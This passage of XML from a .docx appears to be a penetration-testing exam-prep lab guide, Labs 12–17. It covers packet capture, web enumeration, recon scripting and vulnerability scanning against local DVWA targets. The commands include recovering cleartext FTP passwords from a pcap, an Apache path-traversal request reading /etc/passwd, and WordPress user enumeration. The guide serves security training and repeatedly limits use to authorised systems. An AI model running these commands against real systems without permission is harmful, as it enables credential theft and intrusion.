          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo apt update &amp;&amp; sudo apt install -y wireshark tshark tcpdump</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Capture live traffic on the LAN interface to a pcap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo tcpdump -i eth0 -w capture.pcap -c 2000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Open the capture and apply protocol display filters</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>wireshark capture.pcap   # filters:  http || dns || ftp || tcp.port==23</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Isolate a cleartext service and follow its TCP stream</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># Wireshark: right-click a packet &gt; Follow &gt; TCP Stream</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Recover cleartext FTP credentials with tshark</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>tshark -r capture.pcap -Y 'ftp.request.command in {USER PASS}' -T fields -e ftp.request.command -e ftp.request.arg</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Extract HTTP hosts, URIs and TCP conversations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>tshark -r capture.pcap -q -z conv,tcp; tshark -r capture.pcap -Y http.request -T fields -e http.host -e http.request.uri</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Spot on-path/ARP poisoning in the capture</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>tshark -r capture.pcap -Y 'arp.duplicate-address-detected || arp.opcode==2'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Export transferred HTTP objects for the report</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>tshark -r capture.pcap --export-objects http,./http_objects &amp;&amp; ls http_objects</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm you can filter a capture to a single protocol, follow a TCP stream end to end, and recover cleartext credentials from the pcap — the packet-analysis skill on-path attacks and the exam rely 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labs/lab-12-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 13 — Web Enumeration: Gobuster, Wfuzz, WhatWeb</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Web crawling and manual enumeration of a web application.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner fingerprints a web stack with WhatWeb, reads exposed files, brute-forces directories and parameters with Gobuster, ffuf and Wfuzz, enumerates vhosts, and scans WordPress with WPScan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A web app tech profile, directory/parameter/vhost lists, and WPScan findings   (Tools: WhatWeb, Gobuster, ffuf, Wfuzz, WPScan, curl.)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Spin up the DVWA target in Docker</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo docker run --rm -d --name dvwa -p 80:80 vulnerables/web-dvwa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Fingerprint the stack with WhatWeb</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>whatweb -v $TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Read robots.txt, sitemap and exposed .git</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>curl -s $TARGET/robots.txt; curl -s $TARGET/.git/HEAD</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Brute-force directories with Gobuster</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>gobuster dir -u $TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 -o gobuster.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Fuzz request parameters with Wfuzz</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 "$TARGET/vulnerabilities/sqli/?FUZZ=1"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Enumerate virtual hosts with Gobuster vhost</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>gobuster vhost -u http://example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Enumerate WordPress plugins, themes and users</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>wpscan --url https://wp.example.com --enumerate vp,vt,u --random-user-agent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm WhatWeb identifies the stack, Gobuster and Wfuzz reveal hidden paths and parameters, and WPScan enumerates WordPress users, plugins and themes.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labs/lab-13-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 14 — Recon Scripting with Bash and Python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Modify scripts for reconnaissance, enumeration and validation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner writes and modifies a Bash bulk DNS resolver and a Python threaded TCP port scanner, then extends them with banner grabbing and the scapy and requests libraries.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A Bash DNS-resolver script and a Python threaded TCP port scanner   (Tools: Bash, dig, Python, socket, scapy, requests.)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scripts working directory</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>mkdir -p ~/scripts &amp;&amp; cd ~/scripts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Write a Bash while-read DNS resolver</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>nano resolve.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run the resolver over a subdomain list</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>chmod +x resolve.sh; ./resolve.sh subs.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Modify the script to add MX records</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>mx=$(dig +short "$host" MX | head -1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Write a Python threaded TCP port scanner</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>nano portscan.py</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run the port scanner against a host</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>./portscan.py 127.0.0.1 20-100</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Extend the scanner with banner grabbing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>s.send(b'HEAD / HTTP/1.0\r\n\r\n'); return s.recv(256).decode(errors='ignore').splitlines()[0]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Automate recon with scapy and requests</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>reply = sr1(IP(dst='8.8.8.8')/ICMP(), timeout=1, verbose=0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm resolve.sh writes a subdomain,ip CSV and portscan.py prints the open ports for a host, demonstrating the read-and-modify skill the exam tests.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labs/lab-14-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Topic 03 — Vulnerability Discovery and Analysis  (17%)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OpenVAS · Nikto &amp; ZAP · Trivy &amp; Grype · TruffleHog · Validation &amp; Exploit Selection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Vulnerability scanning (Greenbone/OpenVAS) automates the discovery of missing patches, weak configurations and known CVEs across the network.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Web, container-image and secrets scanning (Nikto, ZAP, Trivy, Grype, TruffleHog) each target a different layer of a modern application stack.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Scanners produce false positives; every finding must be manually validated before it is reported or exploited.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Public exploit selection (Exploit-DB, searchsploit, Metasploit) requires matching the exact service version and understanding the exploit's impact before running it.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 15 — Vulnerability Scanning with Greenbone / OpenVAS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 3.1 Conduct vulnerability discovery (network scans, authenticated/unauthenticated, host-based); 3.2 Analyse scan output..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner deploys Greenbone CE via Docker, scans a vulnerable target, and triages the findings by severity, QoD, and manual validation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A triaged Greenbone/OpenVAS scan report with true and false positives separated.   (Tools: Greenbone/OpenVAS, Docker, gvm-cli, Nmap, curl.)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Deploy Greenbone CE with Docker Compose</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>mkdir greenbone &amp;&amp; cd greenbone; curl -O https://greenbone.github.io/docs/latest/_static/docker-compose-22.4.yml; sudo docker compose -f docker-compose-22.4.yml -p greenbone up -d</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Watch the vulnerability feed sync</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo docker compose -p greenbone logs -f gvmd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Add a target for the vulnerable VM in the GSA UI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Attach SSH/SMB creds for an authenticated scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Create and start a Full and fast scan task</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Triage findings by severity and QoD</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Validate the MS17-010 SMB finding with Nmap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>nmap --script smb-vuln-ms17-010 &lt;TARGET&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Validate the Apache path traversal with curl</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>curl http://target/cgi-bin/.%2e/.%2e/etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>List scan tasks from the CLI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo gvm-cli socket --xml="&lt;get_tasks/&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm high-severity findings are validated as true positives and the report exports to PDF/XML/CSV.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labs/lab-15-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 16 — Web Vulnerability Scanning with Nikto and ZAP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 3.1 Application scans (DAST); 4.5 Web app attack tools (ZAP)..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner scans DVWA with Nikto and OWASP ZAP, running ZAP both headless and as an authenticated GUI active scan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Nikto and ZAP DAST reports cross-referenced to the OWASP Top 10.   (Tools: Nikto, OWASP ZAP, zap-cli, Wapiti, DVWA, Docker.)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Start the DVWA target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo docker run --rm -d --name dvwa -p 80:80 vulnerables/web-dvwa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Scan the app with Nikto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>nikto -h http://127.0.0.1 -o nikto.html -Format htm</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Launch the ZAP headless daemon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>zaproxy -daemon -port 8090 -config api.disablekey=true &amp;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run a ZAP quick baseline scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>zap-cli -p 8090 quick-scan --self-contained --start-options "-config api.disablekey=true" http://127.0.0.1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run the official ZAP Docker baseline scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t http://host.docker.internal -r baseline.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Proxy the DVWA login and run a GUI active scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Get a third opinion with Wapiti</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>wapiti -u http://127.0.0.1 -f html -o wapiti-report</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Generate and export the ZAP HTML report</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm the ZAP Alerts tab shows SQL injection, XSS, and CSRF and reports are saved to the engagement folder.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labs/lab-16-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 17 — Container Image Scanning with Trivy and Grype</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 3.1 Container scans (including sidecar), SCA, IaC scanning; Kube-hunter..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner scans a container image with Trivy and Grype, scans Dockerfile/IaC and SBOMs, and runs kube-hunter against a cluster.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Trivy and Grype CVE reports plus IaC misconfiguration and kube-hunter findings.   (Tools: Trivy, Grype, kube-hunter, minikube, jq, Docker.)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Trivy and Grype</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo apt install -y trivy; curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sudo sh -s -- -b /usr/local/bin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Scan a public image with both tools</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>trivy image --severity HIGH,CRITICAL nginx:1.18.0; grype nginx:1.18.0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Save scan output as JSON</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>trivy image --format json --output nginx-trivy.json nginx:1.18.0; grype nginx:1.18.0 -o json &gt; nginx-grype.json</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Scan a Dockerfile and IaC config</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>trivy config Dockerfile.bad; trivy config ./k8s/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run software composition analysis on the filesystem</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>trivy fs --scanners vuln,secret,license .</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Start minikube and run kube-hunter</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>minikube start --driver=docker; pip install kube-hunter; kube-hunter --remote $(minikube ip)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Extract critical CVEs with jq</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>jq '.Results[].Vulnerabilities[]? | select(.Severity=="CRITICAL") | .VulnerabilityID' nginx-trivy.json</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
